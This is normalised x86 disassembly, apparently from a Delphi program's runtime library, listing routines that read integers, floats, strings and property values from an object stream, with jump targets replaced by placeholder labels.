mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c4c0
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41ce78
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41defc
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d078
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c4c0
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41cec8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41defc
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d078
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c4c0
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41cf0c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41defc
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41bf98
mov al [ eax + lookup_table_41cf33 ]
jmp [ eax * 4 + jump_table_41cf41 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c4c0
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40419c
mov eax esi
call j_sub_404578
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c4c0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404100
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404100
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404100
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404100
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41d00c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41defc
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41c4c0
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41c4c0
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c4c0
jmp r-xdata
jmp r-xdata
call sub_41bf98
sub_41d078
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41c49c
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41d00c
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41defc
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c4c0
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41d0cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41c49c
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41defc
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41d00c
mov [ edi ] eax
sub_41d10c
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41d1fd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4040ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404144
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d204
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403200
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404310
sub_41d228
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41d3f8
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push sub_41d3ad
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41dd20
xor edx edx
push ebp
push sub_41d386
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_40436c
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4045cc
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034d8
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414d34
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034d8
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414d34
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d5ac
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c4ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c4ac
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_414e28
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41d20c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3ff
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov edi ebx
jmp r-xdata
sub_41d3b2
add [ eax ] eax
add [ eax ] al
push 0xbe004072
rol [ ecx ] cl
mov ebx eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403a8c
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3ff
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_41d408
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_418218
mov ebx eax
test ebx ebx
je r-xdata
call sub_41bf98
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414e9c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d450
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ba2c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418854
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d490
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41d4df
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e614
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4156bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d4e6
lea eax [ ebp - 0x10 ]
call sub_40f260
retn
sub_41d4ec
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41d59e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c49c
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41cf0c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ba2c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418854
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41defc
lea eax [ ebp - 0x4 ]
call sub_405944
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_415858
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d5a5
lea eax [ ebp - 0x8 ]
call sub_4040ac
lea eax [ ebp - 0x4 ]
call sub_405944
retn
sub_41d5ac
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d8a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d8ae
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0x24 ]
call sub_4047b8
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_4040d0
retn
jmp [ eax * 4 + jump_table_41d63c ]
mov eax [ rw-data ]
call sub_41bf80
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e28
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c49c
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c55c
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e9c
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41cf0c
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_414cd0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e9c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cdf0
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415470
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41dd5c
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415170
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41de18
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415284
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41dc40
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e9c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c49c
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c49c
cmp al 0xd
jne r-xdata
push ebp
call sub_41d490
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d078
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41579c
jmp r-xdata
push ebp
call sub_41d4ec
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e28
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d00c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e9c
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41cf0c
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d408
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41defc
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e9c
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41cf0c
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41defc
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41573c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41defc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e28
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c5b4
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41573c
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41cf0c
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d450
pop ecx
jmp r-xdata
sub_41d8b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_404100
jmp r-xdata
mov eax [ ebx ]
call sub_4183b0
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408fe4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d914
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41dc2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41dcfc
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41dc0d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41dbce
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41dd20
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41dd20
mov eax [ ebp - 0x1c ]
call sub_417f08
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41dd20
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41dd20
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41d8b4
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41dd20
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4031f8
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417c58
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41db73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_406074
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_418854
xor eax eax
push ebp
push sub_41db53
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_418a0c
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db5a
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4032b0
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4189b0
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41dba4
call sub_40277c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403ae0
jmp r-xdata
call sub_403a8c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41bca8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc14
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41dbd3
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41be50
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403a8c
call sub_403ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc14
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_4032b0
sub_41dc40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41dcea
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41dcbd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41defc
cmp al 0xb
je r-xdata
mov eax ebx
call sub_414ba0
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41bf98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41bfd0
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dcf1
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41dd20
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41dd20
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c4c0
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40419c
mov eax esi
call j_sub_404578
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c4c0
pop edx
pop esi
pop ebx
retn
sub_41dd5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41de09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c49c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41de18
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404334
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de10
lea eax [ ebp - 0x8 ]
call sub_4047b8
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41defc
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41c4c0
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4046f8
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c4c0
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c4c0
jmp r-xdata
jmp r-xdata
call sub_41bf98
sub_41de18
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41deef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c49c
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41dd5c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404904
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41def6
lea eax [ ebp - 0xc ]
call sub_4040ac
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41defc
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c4c0
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404a00
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41c4c0
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c4c0
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4046f8
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c4c0
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405d14
jmp r-xdata
jmp r-xdata
call sub_41bf98
sub_41df10
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41df4c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41dd20
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41df53
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_41df58
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41c158
test al al
je r-xdata
mov eax [ ebx ]
call sub_41e00c
mov eax [ ebx ]
call sub_41d0c4
pop ebx
pop ebp
retn
sub_41df80
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c4c0
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e404
pop ebx
pop ecx
pop ebp
retn
sub_41dfb0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41c158
test al al
je r-xdata
mov eax [ ebx ]
call sub_41c49c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41d0c4
pop ebx
pop ebp
retn
